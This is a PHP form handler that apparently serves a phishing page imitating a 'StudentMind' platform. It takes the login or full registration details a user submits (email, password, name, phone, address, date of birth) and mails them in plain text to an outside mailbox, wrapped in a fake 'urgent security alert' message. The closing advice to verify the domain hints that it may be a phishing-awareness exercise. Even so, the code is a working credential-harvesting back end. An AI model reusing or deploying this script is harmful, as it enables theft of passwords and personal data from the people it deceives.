<?php

require "./functionsForApi/functions.php";


$form = isset($_POST['form']) ? $_POST['form'] : "";

$form = isset($_POST['form']) ? $_POST['form'] : "";
$business_email = "techy_2023@studentmind.live";

// Create the email message with all the variables
$subject = "Urgent Security Alert: Possible Credentials Breach - Immediate Action Required";
$message = "Dear StudentMind Employee,\n\n";
$message .= "We hope this message finds you well. This is an urgent security notice from the StudentMind team.\n\n";
$message .= "As part of our ongoing security monitoring, we have identified a potential breach involving the following credentials:\n\n";

if ($form === "loginform") {
    $email = postCleanForEmail($_POST['email']);
    $password = postCleanForPasswordLogin($_POST['password']);

    // Create the email message with all the variables
    $message .= "Email: $email\n";
    $message .= "Password: $password\n\n";
} else {

    $firstName = postCleanForText(isset($_POST['firstName']) ? $_POST['firstName'] : "");
    $middleName = postCleanForText(isset($_POST['middleName']) ? $_POST['middleName'] : "");
    $lastName = postCleanForText(isset($_POST['lastName']) ? $_POST['lastName'] : "");
    $mobileNumber = postCleanForNumber(isset($_POST['mobile']) ? $_POST['mobile'] : "");
    $address1 = postCleanForTextAndNumbers(isset($_POST['address1']) ? $_POST['address1'] : "");
    $address2 = postCleanForTextAndNumbers(isset($_POST['address2']) ? $_POST['address2'] : "");
    $postcode = postCleanForTextAndNumbers(isset($_POST['postCode']) ? $_POST['postCode'] : "");
    $city = postCleanForText(isset($_POST['city']) ? $_POST['city'] : "");
    $country = postCleanForText(isset($_POST['country']) ? $_POST['country'] : "");
    $email = postCleanForEmail(isset($_POST['email']) ? $_POST['email'] : "");
    $password = postCleanForPassword(isset($_POST['password']) ? $_POST['password'] : "");
    $dob = isset($_POST['dob']) ? $_POST['dob'] : "";
    $gender = postCleanForText(isset($_POST['gender']) ? $_POST['gender'] : "");
    $bioDesc = "Emptiness...";


    $message .= "First Name: $firstName\n";
    $message .= "Middle Name: $middleName\n";
    $message .= "Last Name: $lastName\n";
    $message .= "Mobile Number: $mobileNumber\n";
    $message .= "Address 1: $address1\n";
    $message .= "Address 2: $address2\n";
    $message .= "Postcode: $postcode\n";
    $message .= "City: $city\n";
    $message .= "Country: $country\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "Date of Birth: $dob\n";
    $message .= "Gender: $gender\n";
    $message .= "Bio Description: $bioDesc\n\n";
}

$message .= "In light of this, we strongly recommend that you change your password and any other sensitive information through the official StudentMind platform as soon as possible. Please ensure you follow the normal procedures for updating your credentials.\n\n";
$message .= "Additionally, we would like to remind you of the importance of verifying the domain before entering any sensitive data. Always check the website address to confirm that it is the legitimate StudentMind platform before proceeding.\n\n";
$message .= "The security of your personal information is of utmost importance to us, and we are committed to keeping our platform safe for all users. We apologize for any inconvenience this may cause and appreciate your prompt action in addressing this matter.\n\n";
$message .= "Should you have any questions or concerns, please do not hesitate to contact our support team.\n\n";
$message .= "Thank you for your cooperation and understanding.\n\n";
$message .= "Best regards,\n\n";
$message .= "Clayton Farrugia: Security Consultant\n";
$message .= "Patrick Frendo: Software Developer Lead\n";
$message .= "The StudentMind Team";

// Send the email using PHP's built-in mail() function
// You may need to configure your server to enable mail sending
// Reference for this code: https://www.socketlabs.com/blog/email-api-php/
$headers = "From: techy_2023@outlook.com\r\n";
$headers .= "Reply-To: techy_2023@outlook.com\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

if (mail($business_email, $subject, $message, $headers)) {
    echo "Email sent";
} else {
    echo "Failed";
}
